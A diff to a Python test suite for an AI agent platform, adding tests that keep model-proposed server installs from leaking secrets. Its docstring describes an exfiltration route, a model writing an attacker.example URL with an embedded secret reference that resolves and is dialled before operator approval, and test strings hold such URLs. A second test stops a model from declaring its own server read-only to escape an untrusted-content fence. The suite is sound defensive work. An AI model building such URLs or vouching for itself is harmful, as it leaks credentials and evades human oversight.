@@ -75,6 +75,85 @@ def test_the_form_has_no_field_for_the_dangerous_things():
           bool(_refused({k: v for k, v in VALID.items() if k != "url"})))
 
 
+def test_a_credential_cannot_ride_in_the_url():
+    """The half that was missing, and the more dangerous half.
+
+    `headers` had to be a {{secret:...}} reference; `url` was checked only
+    against ^https://. But `mcp_client` resolves secret references in the URL
+    too, and `recommendations.create()` spawns `preflight()` the instant a
+    card row is written — so a model could write
+    `https://attacker.example/{{secret:token}}`, and the backend would
+    resolve it and dial it BEFORE any operator saw the card. No approval, no
+    click, no `actions.enabled` gate.
+
+    It did not even need the target to answer: the resolved URL is logged and
+    embedded in `explain()`, which lands in `recommendations.action_detail` —
+    in Postgres, and rendered on the operator's own card.
+
+    `preflight` already drops headers for a model-authored plan on exactly
+    this reasoning. The URL carried the same primitive and nothing dropped
+    it. Reachable only since raise_recommendation gained an `action`.
+    """
+    print("\n2b. a credential cannot ride in the URL")
+    for bad in ("https://x.example/{{secret:github_pat}}",
+                "https://x.example/collect?k={{secret:nova_master}}",
+                "https://{{secret:host}}/mcp"):
+        why = _refused({**VALID, "url": bad})
+        check(f"refused: {bad[:44]}", bool(why), why[:70])
+    check("the refusal says where a credential DOES go",
+          "header" in _refused({**VALID, "url": "https://x.example/{{secret:a}}"}))
+    check("an ordinary https url is untouched",
+          not _refused({**VALID, "url": "https://example.com/mcp?v=2&x=y"}))
+    # the schema the model is shown must carry the constraint too, or she
+    # writes one and only finds out at the door
+    import json as _json
+    shown = _json.dumps(actions.tool_schema() or {})
+    check("...and nothing advertises a url field that accepts one",
+          "{{secret:" not in shown)
+
+
+def test_only_the_operator_can_vouch_for_read_only():
+    """`read_only` is a plain boolean on a form a model now fills in.
+
+    `tools.registry.is_actor()` treats `mcp:<server>/<tool>` as a NON-actor
+    when the server is read-only — the one class of MCP tool allowed to run
+    on a turn already tainted by fetched text. That was sound while only a
+    person could tick the box. A model proposing `read_only: true` would have
+    been exempting its own server's tools from the untrusted-context fence by
+    its own say-so.
+
+    So the exemption follows WHO DECLARED IT — the same provenance test
+    `mcp_client._guard_url` applies to where a server may dial.
+    """
+    import asyncio
+
+    print("\n2c. only the operator can vouch for read_only")
+
+    async def run():
+        from app import db, mcp_servers
+        await db.init_pool()
+        try:
+            async with db.acquire() as conn:
+                for who in ("operator", "action"):
+                    await conn.execute(
+                        "INSERT INTO mcp_servers (name, transport, url, "
+                        " read_only, enabled, created_by) "
+                        "VALUES ($1,'http','https://example.com/mcp',true,true,$2)",
+                        f"scratch-ro-{who}", who)
+            slugs = await mcp_servers.read_only_slugs()
+            check("an operator-declared read-only server is exempt",
+                  "scratch-ro-operator" in slugs, str(sorted(slugs)))
+            check("...and one an ACTION created is not, however it declared "
+                  "itself — a model cannot vouch for its own server",
+                  "scratch-ro-action" not in slugs, str(sorted(slugs)))
+        finally:
+            async with db.acquire() as conn:
+                await conn.execute(
+                    "DELETE FROM mcp_servers WHERE name LIKE 'scratch-ro-%'")
+
+    asyncio.run(run())
+
+
 def test_a_credential_can_only_be_a_reference():
     print("\n2. headers carry references, never secrets")
     literal = {**VALID, "headers": {"Authorization": "Bearer sk-live-abc"}}
@@ -444,6 +523,12 @@ def test_a_failed_run_leaves_nothing_behind():
                     "DELETE FROM agents WHERE name LIKE 'scratch-t13-%'")
                 await conn.execute(
                     "DELETE FROM mcp_servers WHERE name LIKE 'scratch-t13-%'")
+                # This suite is called "leaves nothing behind" and left four
+                # rows in Nova's system prompt: capability_events feeds
+                # `prompt_block()`, so agents and servers created here were
+                # reported to her as real changes to her own capabilities.
+                await conn.execute(
+                    "DELETE FROM capability_events WHERE subject LIKE 'scratch-t13-%'")
 
     asyncio.run(run())
 
@@ -516,6 +601,17 @@ def test_an_approved_install_actually_finishes():
             async with db.acquire() as conn:
                 await conn.execute("DELETE FROM mcp_servers WHERE name = $1", name)
                 await conn.execute("DELETE FROM agents WHERE name = $1", agent)
+                # ...and the capability events, which are NOT bookkeeping:
+                # `capability_events.prompt_block()` is injected into every
+                # agent's prompt as "what changed about you recently", so a
+                # scratch server left here is a fact Nova is told about
+                # herself. Measured: 102 rows from repeated runs of this
+                # suite, live in her prompt, naming servers that never
+                # existed. A test that mutates what the model believes has
+                # to clean that up too.
+                await conn.execute(
+                    "DELETE FROM capability_events WHERE subject = ANY($1::text[])",
+                    [name, agent])
 
     asyncio.run(run())
 
@@ -623,6 +719,8 @@ def test_she_can_fill_in_the_form_herself():
 def main() -> int:
     for t in (test_the_form_has_no_field_for_the_dangerous_things,
               test_a_credential_can_only_be_a_reference,
+              test_a_credential_cannot_ride_in_the_url,
+              test_only_the_operator_can_vouch_for_read_only,
               test_the_operator_approves_what_actually_runs,
               test_the_button_never_promises_more_than_the_code_does,
               test_an_executor_cannot_outlive_its_operator_route,
